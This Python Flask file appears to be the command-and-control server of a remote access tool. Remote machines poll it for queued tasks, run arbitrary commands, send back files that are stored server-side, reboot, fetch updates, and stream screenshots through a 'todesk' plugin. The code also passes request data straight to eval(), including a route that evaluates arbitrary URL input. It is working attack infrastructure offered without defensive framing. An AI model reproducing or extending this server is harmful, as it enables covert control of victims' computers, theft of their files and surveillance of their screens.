#         -*- coding:utf-8 -*-        #
#  Copyright (c) 2019 - 2039 XueQian  #
#         version_added:: 2.0.0         #
import os
import time
import random
import threading
from flask import *

app = Flask(__name__)
renwu = {}  # '': [['command / sendfile / reboot / update', 'command...'], ['commands', 'commands...', 'result']]
result = {}  # '': [{'time2': 1558984684, 'time': '%Y-%m-%d, %H:%M:%S', 'os': 'command', 'result', 'result'}]
computers = {}  # '': {'time': 1468798451, 'r': False / True}
plugins = {}


def _while():
    while True:
        try:
            for i in computers:
                if time.time() - computers[i]['time'] > 7:
                    computers[i]['r'] = False
        except:
            pass
        time.sleep(1)


def _time(i=0):
    if i == 1:
        return time.time()
    else:
        return time.strftime('%Y-%m-%d, %H:%M:%S', time.localtime(time.time()))


def mkdir(path):
    path = path[:-len('\\' + path.split('\\')[-1])]

    # 判断结果
    if not os.path.exists(path):
        os.makedirs(path)
        return True
    else:
        return False


@app.route('/', methods=['GET', 'POST'])
def zy():
    if request.method == 'GET':
        return redirect('/control2')
    elif not ('python' in request.headers.get('User-Agent')):
        return "I'm a teapot.", 418

    try:
        computers[request.json.get('name')]['time'] = _time(1)
        computers[request.json.get('name')]['r'] = True
    except:
        computers[request.json.get('name')] = {'r': True, 'time': _time(1)}

    if request.json.get('headers') is None:
        if request.json.get('name') not in renwu:
            renwu[request.json.get('name')] = []
            result[request.json.get('name')] = []
            return jsonify({'jieguo': None})
        elif renwu[request.json.get('name')] == []:
            return jsonify({'jieguo': None})
        else:
            c = random.choice(renwu[request.json.get('name')])
            if c[0] == 'sendfile':
                return {'jieguo': c[0], 'shuju': c[1]}
            elif c[0] == 'commands':
                return {'jieguo': c[0], 'shuju': c[1], 'fanhui': c[2]}
            return {'jieguo': c[0], 'shuju': c[1]}


    else:  # request.json.get('headers') == 'return'
        if request.json.get('type') == 'os':
            renwu[request.json.get('name')].remove(request.json.get('os'))
            result[request.json.get('name')].append(
                {'time2': _time(1), 'time': _time(),
                 'os': request.json.get('os'), 'result': request.json.get('result')})

        elif request.json.get('type') == '_os':
            renwu[request.json.get('name')].remove(request.json.get('os'))
            result[request.json.get('name')].append(
                {'time2': _time(1), 'time': _time(),
                 'os': request.json.get('os'), 'result': request.json.get('result')})

        elif request.json.get('type') == 'update':
            renwu[request.json.get('name')].remove(['update', ''])
            result[request.json.get('name')].append(
                {'time2': _time(1), 'time': _time(),
                 'os': 'update'})

        elif request.json.get('type') == 'sendfile':
            _dir = f'.\\static\\sendfile\\{request.json.get("name")}\\{request.json.get("os").replace(":", "：")}'
            mkdir(_dir)
            open(_dir, 'wb').write(eval(request.json.get('file')))
            renwu[request.json.get('name')].remove(['sendfile', request.json.get('os')])
            result[request.json.get('name')].append(
                {'time2': _time(1), 'time': _time(), 'os': request.json.get('os'), 'result': _dir})

        elif request.json.get('type') == 'reboot':
            renwu[request.json.get('name')].remove(['reboot', ''])
            result[request.json.get('name')].append(
                {'time2': _time(1), 'time': _time(), 'os': 'reboot'})
        return ''


@app.route('/control')
def control():
    return render_template('1.html', renwu=renwu, result=result, computers=computers)


@app.route('/control2')
def control2():
    return render_template('2.html')


@app.route('/add')
def add():
    if request.args.get('val') == 'commands':
        renwu[request.args.get('name')].append([request.args.get('val'), request.args.get('val3'),
                                                request.args.get('val5')])
    else:
        renwu[request.args.get('name')].append([request.args.get('val'), request.args.get('val3')])
    return redirect('/control')


@app.route('/plugin/<name>')
def plugin(name):
    return render_template(f'plugins/{name}.html', com=request.args.get('com'))


@app.route('/plugins/<name>', methods=['GET', 'POST'])
def _plugins(name):
    if name == 'todesk':
        if request.args.get('q') == 'r':
            try:
                com = request.args.get('com')
                plugins['todesk'][com]['see'] = _time(1)
                return 'data:image/png;base64,' + plugins['todesk'][com]['pic']
            except:
                return 'data:image/png;base64,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'
        com = request.json.get('com')
        pic = request.json.get('pic')
        try:
            plugins['todesk']
        except:
            plugins['todesk'] = {}
        try:
            plugins['todesk'][com]
        except:
            plugins['todesk'][com] = {'see': 0}
        plugins['todesk'][com]['time'] = _time(1)
        plugins['todesk'][com]['pic'] = pic
        if _time(1) - plugins['todesk'][com]['see'] > 1000:
            return 'not in see'
        return 'ok'
    return 'not'


@app.route('/all')
def all():
    # return jsonify([{"DESKTOP-6PFPJ9N":{"r":False,"time":1690293231.2157145}, "DESKTOP-123":{"r":True,"time":1690293231.2157145}},{"DESKTOP-6PFPJ9N":[["commands","a = int('1')","a"]], "DESKTOP-123":[["commands","a = int('5201111')","666"]]},{"DESKTOP-6PFPJ9N":[{"os":["command","print(1)"],"result":"None","time":"2023-07-25, 21:53:46","time2":1690293226.1894958}]}])
    return jsonify([computers, renwu, result])


@app.route('/c/<name>')
def _room(name):
    return jsonify(eval(name))


@app.route('/save')
def save():
    oo = open('1.txt', 'w')
    oo.write(request.args.get('c'))
    oo.close()
    return ''


@app.route('/update')
def update():
    return send_file(r'D:\xue\xq.pro项目\大             项目\获取电脑\becontrol\be controlled.py')


# 发送请求并等待回复
@app.route('/kuaisu')
def kuaisu():
    if request.args.get('val') == 'commands':
        x = [request.args.get('val'), request.args.get('val3'), request.args.get('val5')]
    else:
        x = [request.args.get('val'), request.args.get('val3')]
    renwu[request.args.get('name')].append(x)
    times = _time(1)
    while True:
        s = result[request.args.get('name')]
        for i in s:
            try:
                if request.args.get('val') == 'sendfile':
                    if i['time2'] > times and i['os'] == x[1]:
                        return send_file(i['result'])
                else:
                    if i['time2'] > times and i['os'] == x:
                        return jsonify(i)
            except:
                pass
        time.sleep(1)


if __name__ == '__main__':
    t1 = threading.Thread(target=_while)
    t1.daemonic = True
    t1.start()

    print(" * Run's time: " + time.strftime('%Y-%m-%d, %H:%M:%S', time.localtime(time.time())))
    print(" * Running at http://xueqian.pro:1902/control")
    app.run(host='192.168.3.10', port=1902, debug=False)

# host='192.168.3.10'
